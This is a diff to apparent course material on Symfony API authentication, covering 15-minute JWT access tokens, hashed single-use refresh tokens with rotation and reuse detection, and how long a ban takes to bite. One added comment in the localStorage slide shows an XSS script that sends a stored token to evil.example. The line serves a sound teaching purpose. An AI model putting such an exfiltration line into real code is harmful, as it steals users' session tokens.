@@ -73,20 +73,20 @@ slides:
   - slug: access-refresh
     title: 'Short-lived access tokens and refresh tokens'
     kind: howto
-    tldr: 'The access token lasts 15 minutes. The refresh token lasts long, is single-use and stored hashed in the database, so a theft does limited damage.'
-    keywords: ['access token', 'refresh token', 'rotation', 'reuse detection', 'access_token handler', 'token renewal']
+    tldr: 'The access token is a signed JWT that lasts 15 minutes. The refresh token lasts long, is single-use and stored hashed in the database, so a theft does limited damage.'
+    keywords: ['access token', 'refresh token', 'rotation', 'reuse detection', 'JWT verification', 'token renewal']
     blocks:
       - type: text
         body: |
-          The fix is two kinds of token. The **access token** lasts 15 minutes, so a stolen one does limited harm. The **refresh token** lasts a long time, is only used to fetch a new access token, and can be revoked because it lives in the database. Each refresh consumes the old one and issues a new one (rotation).
+          The fix is two tokens. The **access token** is a signed JWT that lives 15 minutes: the API checks its signature and expiry, with no database lookup, so it stays fast. The **refresh token** lives 30 days, is a random string kept hashed in the database, and is used only to get a new access token. Each refresh spends the old one and issues a new pair (rotation). To lock Sumi out, delete her refresh tokens: her access token dies on its own and she can't get another.
       - type: visual
         kind: flow
         caption: 'When the access token goes stale, the refresh token gets a fresh pair'
         nodes:
           - {id: app, label: 'Vue app', sub: 'browser', icon: browser, col: 0, row: 0, tip: 'The user''s browser. It calls the API with the access token.'}
-          - {id: api, label: 'API', sub: 'access_token firewall', icon: api, col: 2, row: 0, tip: 'Verifies the access token on every request.'}
+          - {id: api, label: 'API', sub: 'signature check only', icon: api, col: 2, row: 0, tip: 'Verifies the JWT''s signature and expiry on every request. No database call for the token itself.'}
           - {id: refresh, label: '/api/token/refresh', sub: 'rotation', icon: repeat, tone: accent, col: 2, row: 1.5, tip: 'Takes the old refresh token and returns a new access and refresh pair.'}
-          - {id: db, label: 'Database', sub: 'token hashes', icon: db, col: 4, row: 1.5, tip: 'Holds the refresh token''s SHA-256 hash, expiry and used flag. The real token is not stored.'}
+          - {id: db, label: 'Database', sub: 'refresh token hashes', icon: db, col: 4, row: 1.5, tip: 'Holds each refresh token''s SHA-256 hash, expiry and used flag. The real token is not stored.'}
         edges:
           - {from: app, to: api, label: 'A request goes out with a valid access token'}
           - {from: api, to: app, label: 'After 15 minutes: 401, the access token is dead', dashed: true, tone: bad}
@@ -94,31 +94,9 @@ slides:
           - {from: refresh, to: db, label: 'Checks the hash: valid and not yet used'}
           - {from: refresh, to: app, label: 'Returns a new pair; the old refresh token is spent', dashed: true, tone: good}
       - type: code
-        lang: php
-        file: 'src/Security/AccessTokenHandler.php'
-        variant: good
-        code: |
-          final class AccessTokenHandler implements AccessTokenHandlerInterface
-          {
-              public function __construct(private AccessTokenRepository $tokens) {}
-
-              public function getUserBadgeFrom(#[\SensitiveParameter] string $accessToken): UserBadge
-              {
-                  // the database holds a hash of the token, not the token itself
-                  $row = $this->tokens->findActiveByHash(hash('sha256', $accessToken));
-                  if (null === $row) {
-                      throw new BadCredentialsException('Invalid credentials.');
-                  }
-
-                  return new UserBadge($row->getUser()->getUserIdentifier());
-              }
-          }
-        marks:
-          - {line: 8, tip: 'Even if the database is stolen, the real token can''t be rebuilt from the hash.'}
-          - {line: 9, tip: 'Revoked or expired tokens are rejected right here, so a ban takes effect immediately.'}
-      - type: code
         lang: yaml
         file: 'config/packages/security.yaml'
+        variant: good
         code: |
           security:
               firewalls:
@@ -126,20 +104,108 @@ slides:
                       pattern: ^/api
                       stateless: true
                       access_token:
-                          token_handler: App\Security\AccessTokenHandler
+                          token_handler:
+                              oidc:
+                                  algorithms: ['HS256']
+                                  keyset: '%env(JWT_KEYSET)%'
+                                  audience: 'company-api'
+                                  issuers: ['company-api']
         marks:
           - {line: 5, tip: 'stateless: true means Symfony creates no session; the token on each request is the identity.'}
+          - {line: 8, tip: 'The oidc handler verifies a signed JWT: signature, expiry, audience and issuer. It reads no token table.'}
+          - {line: 10, tip: 'The signing key comes from an environment secret, never from git.'}
+      - type: code
+        lang: php
+        file: 'src/Controller/TokenController.php'
+        variant: good
+        code: |
+          #[Route('/api/token/refresh', methods: ['POST'])]
+          public function refresh(
+              Request $request,
+              RefreshTokenStore $store,
+              AccessTokenIssuer $issuer,
+          ): JsonResponse {
+              $hash = hash('sha256', (string) $request->cookies->get('refresh_token'));
+              $row = $store->findByHash($hash);
+              if (null === $row || $row->isExpired()) {
+                  throw new AccessDeniedHttpException('Log in again.');
+              }
+              if ($row->isUsed()) {
+                  // a spent token came back: someone copied it
+                  $store->revokeAllFor($row->getUser());
+                  throw new AccessDeniedHttpException('Log in again.');
+              }
+              $store->markUsed($row);
+              $newRefresh = $store->issueFor($row->getUser()); // random_bytes(32), saved hashed
+
+              // $newRefresh travels back in an HttpOnly cookie (see the cookie slide)
+              return new JsonResponse([
+                  'accessToken' => $issuer->create($row->getUser(), ttl: 900), // 15 minutes
+              ]);
+          }
+        marks:
+          - {line: 8, tip: 'Look the token up by its hash. A missing row means revoked or never issued.'}
+          - {line: 14, tip: 'Reuse detection: a token that was already spent is back, so cut off the whole family.'}
+          - {line: 17, tip: 'Rotation: the old token is marked used, and a brand-new one is issued.'}
     aside:
+      - type: terms
+        items:
+          - {term: 'Opaque token', meaning: 'A random string that means nothing by itself. Only the server''s database knows whose it is.'}
+          - {term: 'Rotation', meaning: 'Swapping the refresh token for a new one on every use, so each one works once.'}
       - type: tips
         items:
-          - 'Add reuse detection to refresh tokens: if a spent token shows up again, revoke all of that user''s tokens, because someone stole one.'
           - 'Make refresh tokens opaque random strings from random_bytes(32), and never pack any data into them.'
+          - 'The admin''s "disable user" action should call revokeAllFor() too, or the ban only takes effect when the refresh token expires.'
       - type: refs
         items:
           - {to: 'security/account-recovery', label: 'Revoking every session when the password changes'}
+          - {to: 'security/secrets-management', label: 'Keeping the signing key out of git'}
     check:
       q: 'Why is the refresh token stored hashed in the database, and what does rotation give you?'
       a: 'If the database leaks, the hash doesn''t reveal the real token. With rotation every refresh issues a new token, so a spent one showing up again exposes a theft.'
+
+  - slug: ban-delay
+    title: 'What a ban costs: up to 15 minutes'
+    kind: compare
+    tldr: 'With short tokens a ban bites within 15 minutes, not 29 days. If that is too slow, you pay with a lookup on every request.'
+    keywords: ['ban delay', 'revocation window', 'denylist', 'immediate logout', 'token lifetime trade-off']
+    blocks:
+      - type: text
+        body: |
+          Rahim's admin disables Sumi at 10:00. Her access token was issued at 09:55, so it runs until 10:10. Until then the API still accepts it. At 10:10 it expires, and her refresh attempt finds no row in the database. The worst case is 15 minutes instead of 29 days. That wait is the price of never asking the database about each request.
+      - type: visual
+        kind: sequence
+        caption: 'The same ban as before, with a 15-minute token: Sumi is out by 10:11'
+        actors:
+          - {id: sumi, label: 'Sumi', icon: user, tip: 'The dismissed employee, holding an access token issued at 09:55.'}
+          - {id: api, label: 'API', icon: api, tip: 'Checks signature and expiry only, so it can''t know about the ban.'}
+          - {id: db, label: 'Database', icon: db, tip: 'Her refresh tokens were deleted at 10:00.'}
+        messages:
+          - {at: db, note: '10:00 admin disables Sumi, refresh rows deleted', tone: good, tip: 'Revoking the refresh tokens is the real ban.'}
+          - {from: sumi, to: api, label: '10:05 GET /api/reports + access token', tip: 'The token has 5 minutes left.'}
+          - {from: api, to: sumi, label: '200 OK: the last minutes of access', dashed: true, tone: warn, tip: 'This is the cost: the API still trusts the token.'}
+          - {from: sumi, to: api, label: '10:11 GET /api/reports + same token', tip: 'The 15 minutes are over.'}
+          - {from: api, to: sumi, label: '401: token expired', dashed: true, tone: good, tip: 'The expiry date inside the token shuts her out without any lookup.'}
+          - {from: sumi, to: api, label: 'POST /api/token/refresh', tip: 'She tries to get a fresh token.'}
+          - {at: db, note: 'No refresh row for her: refused', tone: good, tip: 'The only thing that can issue new tokens is gone.'}
+      - type: visual
+        kind: table
+        caption: 'Three ways to cut off a user, and what each one costs'
+        headers: ['', 'Short JWT + refresh', 'Check user each request', 'Server-side session']
+        rows:
+          - cells: ['Ban takes effect', 'Within 15 minutes', 'Immediately', 'Immediately']
+            tip: 'Only the short JWT has a delay.'
+          - cells: ['Extra cost per request', 'None, signature only', 'One database read', 'One store read (Redis)']
+            tip: 'Immediate bans always cost a read; the short JWT skips it.'
+          - cells: ['Fits when', 'Many services, mobile API', 'A delay is unacceptable', 'A browser-only app']
+            tip: 'Pick by how bad 15 minutes of access would be.'
+    aside:
+      - type: when
+        use: ['Short JWT when 15 minutes of leftover access does no real harm', 'A per-request check when the data is confidential, such as payroll or an admin panel']
+        avoid: ['Never lengthen the access token to 24 hours to "save refreshes": the ban delay grows with it']
+    check:
+      q: 'An admin tool exposes salary data, and a dismissed employee must lose access at once, not in 15 minutes. What do you change?'
+      a: 'Check the user (or a denylist of banned ids) on every request, or use a server session. You pay one read per request for an instant ban.'
 
   - slug: where-to-store
     title: 'Where to keep the token: not localStorage'
@@ -158,6 +224,7 @@ slides:
           const { accessToken } = await api.post('/api/login', creds)
           // any XSS script can read this
           localStorage.setItem('token', accessToken)
+          // attacker's script: fetch('https://evil.example/?t=' + localStorage.token)
         marks:
           - {line: 3, tip: 'Every value in localStorage is readable by any JavaScript on the page, including third-party scripts.'}
       - type: code
@@ -173,7 +240,7 @@ slides:
                   ->withSecure(true)              // HTTPS only
                   ->withSameSite(Cookie::SAMESITE_STRICT)
                   ->withPath('/api/token')        // sent only to the refresh route
-                  ->withExpiresAt(new \DateTimeImmutable('+30 days')),
+                  ->withExpires(new \DateTimeImmutable('+30 days')),
           );
         marks:
           - {line: 5, tip: 'HttpOnly: even with XSS, a script can''t see this cookie''s value.'}
@@ -214,6 +281,11 @@ flashcards:
     more: |
       A short access token keeps the window of damage small if it's stolen. The long-lived refresh token lives in the database, so you can delete it directly on logout or ban.
     ref: access-refresh
+  - q: 'With a 15-minute access token, how long can a banned user still get in?'
+    a: 'Up to 15 minutes, until the access token expires. After that the deleted refresh token can''t fetch a new one.'
+    more: |
+      That wait is the price of not asking the database on every request. If 15 minutes is too long, check the user or a denylist on each request, or use a server-side session. You then pay one read per request.
+    ref: ban-delay
   - q: 'What is refresh token rotation?'
     a: 'Each refresh spends the old token and issues a new pair. If a spent token appears again, it was probably stolen.'
     more: |
@@ -281,6 +353,22 @@ quiz:
         correct: false
         why: 'Theft isn''t prevented; only the damage is limited.'
     ref: access-refresh
+  - q: 'Rahim''s admin deletes Sumi''s refresh tokens at 10:00. Her 15-minute access token was issued at 09:55. When is she locked out?'
+    hint: 'What does the API check on each request, and when does the token stop passing it?'
+    options:
+      - text: 'At 10:00, the moment the tokens are deleted'
+        correct: false
+        why: 'The API only checks the access token''s signature and expiry, so it never learns about the deletion.'
+      - text: 'At 10:10, when the access token expires and no refresh is possible'
+        correct: true
+        why: 'The token passes until its own expiry. After that, the refresh needs a database row, and there is none.'
+      - text: 'After 29 days, when the refresh token expires'
+        correct: false
+        why: 'The refresh row was deleted, so it can''t be used at all. Only the short access token is left to run out.'
+      - text: 'Never, because she still holds an access token'
+        correct: false
+        why: 'An access token dies on its expiry date, and without a refresh token she can''t get another.'
+    ref: ban-delay
   - q: 'Which piece of code puts a developer''s users at the most risk?'
     lang: ts
     code: |
